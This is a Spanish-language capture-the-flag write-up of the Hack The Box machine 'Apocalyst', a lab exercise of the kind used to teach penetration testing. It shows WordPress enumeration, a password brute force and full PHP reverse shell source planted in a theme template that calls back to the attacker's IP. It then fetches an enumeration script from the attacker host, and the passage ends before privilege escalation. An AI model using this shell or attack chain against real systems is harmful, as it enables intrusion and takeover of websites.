---
title: Hack The Box Apocalyst
author: k4miyo
date: 2021-11-26
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [Cryptography, Web]
ping: true
---

## Apocalyst
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.46.

```bash
❯ ping -c 1 10.10.10.46
PING 10.10.10.46 (10.10.10.46) 56(84) bytes of data.
64 bytes from 10.10.10.46: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 141.759/141.759/141.759/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.46 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 21:26 CST
Initiating Ping Scan at 21:26
Scanning 10.10.10.46 [4 ports]
Completed Ping Scan at 21:26, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:26
Scanning 10.10.10.46 [65535 ports]
Discovered open port 80/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
Completed SYN Stealth Scan at 21:26, 35.98s elapsed (65535 total ports)
Nmap scan report for 10.10.10.46
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 36.28 seconds
           Raw packets sent: 67621 (2.975MB) | Rcvd: 67618 (2.705MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.46
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80 10.10.10.46 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 21:29 CST
Nmap scan report for 10.10.10.46
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.03 seconds
```

Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web, vamos a tirarle un `whatweb`:

```bash
❯ whatweb http://10.10.10.46/
http://10.10.10.46/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
```

Tenemos un ***WordPress 4.8*** que al tratar de ingredar vía web, como que lo vemos todo raro:

![](/assets/images/htb-apocalyst/apocalyst-web.png)

Si checamos el código fuente del sitio web, vemos que se está utilizando *virtual hosting*:

![](/assets/images/htb-apocalyst/apocalyst-web1.png)

Asi que agregaremos el dominio `apocalyst.htb` a nuestro archivo `/etc/hosts` y tratamos de ver la página nuevamente.

![](/assets/images/htb-apocalyst/apocalyst-web2.png)

Ahora ya tenemos la web de forma más bonita. Como sabemos que estamos frente a un ***WordPress***, vamos a tratar de descubrir rutas del sitio web con `nmap`:

```bash
❯ nmap --script http-enum -p80 10.10.10.46 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 21:48 CST
Nmap scan report for apocalyst.htb (10.10.10.46)
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /blog/: Blog
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /custom/: Potentially interesting folder
|   /down/: Potentially interesting folder
|   /good/: Potentially interesting folder
|   /hidden/: Potentially interesting folder
|   /idea/: Potentially interesting folder
|   /info/: Potentially interesting folder
|   /information/: Potentially interesting folder
|   /name/: Potentially interesting folder
|   /page/: Potentially interesting folder
|   /personal/: Potentially interesting folder
|   /pictures/: Potentially interesting folder
|   /site/: Potentially interesting folder
|_  /state/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
```

Tenemos algunas rutas interesante a las cuales podríamos echarles un ojo, como por ejemplo `/wp-login.php`; sin embargo, por el momento no contamos con credenciales. También vemos otros recursos como random `/down`, `good`, `hidden`, etc y si accedemos a dichos recursos, vemos la misma imagen.

![](/assets/images/htb-apocalyst/apocalyst-web3.png)

Como sabemos que estamos frente a un ***WordPress***, vamos a hacer uso de la herramienta [WPSeku](https://github.com/Redshoee/WPSeku) para obtener algo de información.

```bash
❯ python wpseku.py -t http://apocalyst.htb
   _    _______  _____      _           
  | |  | | ___ \/  ___|    | |          
  | |  | | |_/ /\ `--.  ___| | ___   _  
  | |/\| |  __/  `--. \/ _ \ |/ / | | | 
  \  /\  / |    /\__/ /  __/   <| |_| | 
   \/  \/\_|    \____/ \___|_|\_\\__,_| 
                                       
|| WPSeku - WordPress Security Scanner
|| Version 0.2.0
|| Momo Outaadi (M4ll0k)
|| https://github.com/m4ll0k/WPSeku

## Target: http://apocalyst.htb/
## Starting: 26/11/2021 22:11:51

## Readme available under: http://apocalyst.htb/readme.html
## XML-RPC Interface available under: http://apocalyst.htb/xmlrpc.php
## License available under: http://apocalyst.htb/license.txt
## Dir /wp-includes/ listing enabled under: http://apocalyst.htb/wp-includes/
## Interesting headers: 

Connection: close
Content-Type: text/html; charset=UTF-8
Server: Apache/2.4.18 (Ubuntu)
Link: <http://apocalyst.htb/?rest_route=/>; rel="https://api.w.org/"

## Running WordPress version: 4.8
No JSON object could be decoded

## Enumerating themes... 
        || Name: twentyseventeen
        || Theme Name: Twenty
        || Theme URI: https://wordpress.org/themes/twentyseventeen/
        || Author: the
        || Author URI: https://wordpress.org/
        || Version: 1.3
        || Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
        || Style: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css

## Enumerating plugins...
        || Not found plugins!

## Enumerating usernames...
        || ID: 0 - Name: falaraki
```

Tenemos un potencial usuario **falaraki** el cual podemos validar desde el panel de login:

![](/assets/images/htb-apocalyst/apocalyst-login.png)

Vemos que el usuario **falaraki** es válido, por lo que ahora nos falta es la contraseña. Antes de tirar por fuerza bruta, debemos recordar que en varias rutas vemos la misma imagen, por lo que es posible que alguna tenga oculto algún dato que nos ayude a obtener la contraseña; así que vamos a crearnos un diccionario de rutas a partir del sitio web con la herramienta `cewl`; esto lo hacemos que dentro del sitio se hace mucha mención de la palabra **apocalyst** y es posible que una variante nos arroje algo diferente.

```bash
❯ cewl -w diccionario.txt http://apocalyst.htb/
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ ll
.rw-r--r-- root root 3.8 KB Fri Nov 26 22:17:50 2021  diccionario.txt
```

Ahora vamos a tratar de descubrir rutas a partir del nuevo diccionario.

```bash
❯ wfuzz -c -L --hc=404 -w diccionario.txt http://apocalyst.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
rrectly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                        
********************************************************                                                                         
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************                                                                         
                                                                                                                                 
Target: http://apocalyst.htb/FUZZ                                                                                                
Total requests: 532                                                                                                              
                                                                                                                                 
=====================================================================                                                    
ID           Response   Lines    Word       Chars       Payload                                                          
=====================================================================                                                   
                                                                                                                                 
000000001:   200        13 L     17 W       157 Ch      "the"                                                            
000000016:   200        13 L     17 W       157 Ch      "site"                                                           
000000015:   200        13 L     17 W       157 Ch      "are"                                                            
000000013:   200        13 L     17 W       157 Ch      "The"                                                           
000000018:   200        13 L     17 W       157 Ch      "revelation"                                                     
000000017:   200        13 L     17 W       157 Ch      "for"                                                            
000000007:   200        13 L     17 W       157 Ch      "Blog"                                                           
000000019:   200        13 L     17 W       157 Ch      "Comments"                                                       
000000011:   200        13 L     17 W       157 Ch      "entry"                                                          
000000010:   200        13 L     17 W       157 Ch      "Daniel"                                                         
000000009:   200        13 L     17 W       157 Ch      "Book"                                                           
000000008:   200        13 L     17 W       157 Ch      "end"                                                            
000000004:   200        13 L     17 W       157 Ch      "Revelation"                                                     
000000005:   200        13 L     17 W       157 Ch      "that"                                                           
000000020:   200        13 L     17 W       157 Ch      "time"                                                          
000000002:   200        13 L     17 W       157 Ch      "and"                                                           
000000026:   200        13 L     17 W       157 Ch      "July"                                                           
000000033:   200        13 L     17 W       157 Ch      "events"                                                         
000000028:   200        13 L     17 W       157 Ch      "has"                                                            
000000024:   200        13 L     17 W       157 Ch      "header"                                                         
000000031:   200        13 L     17 W       157 Ch      "End"                                                            
000000029:   200        13 L     17 W       157 Ch      "been"                                                          
000000037:   200        13 L     17 W       157 Ch      "Feed"                                                           
000000023:   200        13 L     17 W       157 Ch      "WordPress"                                                      
000000035:   200        13 L     17 W       157 Ch      "Assumptio"                                                      
000000069:   200        13 L     17 W       157 Ch      "info"                                                           
000000068:   200        13 L     17 W       157 Ch      "state"                                                         
000000065:   200        13 L     17 W       157 Ch      "Posted"                                                         
000000067:   200        13 L     17 W       157 Ch      "post"                                                           
000000066:   200        13 L     17 W       157 Ch      "meta"                                                           
000000064:   200        13 L     17 W       157 Ch      "Syndication"                                                   
000000063:   200        13 L     17 W       157 Ch      "Simple"                                                         
000000061:   200        13 L     17 W       157 Ch      "RSS"                                                            
000000062:   200        13 L     17 W       157 Ch      "Really"                                                         
000000060:   200        13 L     17 W       157 Ch      "Recent"
```

Dentro del fuzzing aplicamos el parámetro `-L` para el redireccionamiento y como vemos, tenemos varios códigos de estado 200, pero es posible que alguno no tenga la misma cantidad de palabras o caracteres, así que vamos a omitir para 157 caracteres y tratar de ver si encontramos algo.

```bash
❯ wfuzz -c -L --hc=404 --hh=157 -w diccionario.txt http://apocalyst.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ
Total requests: 532

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000455:   200        14 L     20 W       175 Ch      "Rightiousness"                                                 

Total time: 0
Processed Requests: 532
Filtered Requests: 531
Requests/sec.: 0
```

Encontramos uno, el recurso `Rightiousness`, que si accedemos vemos la misma imagen pero es posible que podamos encontrar algo dentro de los bits menos significativos de la imagen. Así que la descargamos y hacemos uso de la herramienta `steghide`:

```bash
❯ steghide info image.jpg
"image.jpg":
  formato: jpeg
  capacidad: 13.0 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "list.txt":
    tamao: 3.6 KB
    encriptado: rijndael-128, cbc
    compactado: si
```

Tenemos que la imagen tiene un archivo adjunto `list.txt`, por lo que vamos a extraerlo:

```bash
❯ steghide extract -sf image.jpg
Anotar salvoconducto: 
anot los datos extrados e/"list.txt".
❯ ll
.rw-r--r-- root   root   3.8 KB Fri Nov 26 22:17:50 2021  diccionario.txt
.rw-r--r-- k4miyo k4miyo 210 KB Fri Nov 26 22:26:33 2021  image.jpg
.rw-r--r-- root   root   3.6 KB Fri Nov 26 22:32:42 2021  list.txt
```

Si le echamos un ojo al archivo `list.txt`, vemos que se trata de un diccionario y como a este punto tenemos un nombre de usuario y nos falta la contraseña, es posible que dicho diccionario contenga el password del usuario **falaraki**. Para variar un poco, vamos a hacer uso de la herramienta `wpscan`:

```bash
❯ wpscan --url "http://apocalyst.htb/" -U falaraki -P list.txt                                                                   
_______________________________________________________________                                                                  
         __          _______   _____
         \ \        / /  __ \ / ____|                 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                           
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \           
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                           
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|         
                                                                                                                                 
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17                         
                                                                                                                                 
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
                                
[i] Updating the Database ...                                   
[i] Update completed.           
                                                                
[+] URL: http://apocalyst.htb/ [10.10.10.46]        
[+] Started: Fri Nov 26 22:42:53 2021                                                                                            
                                
Interesting Finding(s):                                         
                                                                                                                                 
[+] Headers                                                     
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)                                                                                         
 | Confidence: 100%                                                                                                              
                                                                                                                                 
[+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php                
 | Found By: Direct Access (Aggressive Detection)                                                                                
 | Confidence: 100%                                                                                                              
 | References:                                                  
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                            
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
                                                                                                                                 
[+] WordPress readme found: http://apocalyst.htb/readme.html                                                                     
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%                                                                                                              
                                                                
[+] Upload directory has listing enabled: http://apocalyst.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[+] The external WP-Cron seems to be enabled: http://apocalyst.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)                                                                                
 | Confidence: 60%                                              
 | References:                                                                                                                   
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://apocalyst.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://apocalyst.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence) 
 | Found By: Style (Passive Detection)
 |  - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <==================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - falaraki / Transclisiation                          
Trying falaraki / total Time: 00:00:20 <=====================                                 > (335 / 821) 40.80%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Nov 26 22:43:27 2021
[+] Requests Done: 524
[+] Cached Requests: 5
[+] Data Sent: 158.678 KB
[+] Data Received: 18.992 MB
[+] Memory used: 245.012 MB
[+] Elapsed time: 00:00:34
```

Ya tenemos las credenciales de acceso al portal de login de ***WordPress*** y como siempre, antes que nada, vamos a guardarlas y posteriormente a tratar de acceder.

![](/assets/images/htb-apocalyst/apocalyst-login1.png)

Ya para ingresar a la máquina víctima, vamos a editar la plantilla 404 desde **Appearance > Editor > Templates > 404 Template**.

![](/assets/images/htb-apocalyst/apocalyst-shell.png)

Vamos a cambiar su contenido por una [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) que descargamos y modificamos los parámetros.

![](/assets/images/htb-apocalyst/apocalyst-shell1.png)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.27';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Damos click en **Update File**, nos ponemos en escucha por el puerto 443 y tratamos de acceder a la ruta `http://apocalyst.htb/?p=404.php`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.46] 35352
Linux apocalyst 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:05:04 up  1:36,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Antes que nada, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos. A este punto nos encontramos dentro de la máquina como el usuario **www-data** y podemos visualizar la flag (user.txt). Por lo que nos queda enumerar un poco el sistema para ver una forma de escalar privilegios. En esta ocasión vamos a hacer uso de la herramienta [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration), por lo que la descargamos y la transferimos a la máquina víctima dentro de un directorio donde tengamos permisos de lectura, escritura y ejecución.
![](/assets/images/htb-apocalyst/banner-apocalyst.jpg)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.46 - - [26/Nov/2021 23:07:36] "GET /lse.sh HTTP/1.1" 200 -
```

```bash
www-data@apocalyst:/home/falaraki$ cd /dev/shm/
www-data@apocalyst:/dev/shm$ wget http://10.10.14.27/lse.sh
--2021-11-27 05:12:35--  http://10.10.14.27/lse.sh
Connecting to 10.10.14.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: 'lse.sh'

lse.sh                           100%[=======================================================>]  42.55K   151KB/s    in 0.3s    

2021-11-27 05:12:36 (151 KB/s) - 'lse.sh' saved [43570/43570]

www-data@apocalyst:/dev/shm$ chmod +x lse.sh
www-data@apocalyst:/dev/shm$ ls -l
total 44
-rwxrwxrwx 1 www-data www-data 43570 Nov 27 05:05 lse.sh
www-data@apocalyst:/dev/shm$ 
```

Procedemos a ejecutar la herramienta:

```bash
www-data@apocalyst:/dev/shm$ ./lse.sh                                                                                            
---                                                                                                                              
If you know the current user password, write it here to check sudo privileges: www-data
---                                                                                                                              
                                                                                                                                 
 LSE Version: 3.7                                                                                                                
                                                                                                                                 
        User: www-data                                                                                                           
     User ID: 33                                                                                                                 
    Password: ******                                                                                                             
        Home: /var/www                                                                                                           
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin      
       umask: 0000                                                                                                               
                                                                                                                                 
    Hostname: apocalyst                                                                                                          
       Linux: 4.4.0-62-generic                                                                                                   
Distribution: Ubuntu 16.04.2 LTS                                                                                                 
Architecture: x86_64                                                                                                             
                                                                                                                                 
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                 
[i] usr060 Other users..................................................... skip                                                 
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                 
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. yes!
---
-rw-rw-rw- 1 root root 1637 Jul 26  2017 /etc/passwd
---
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
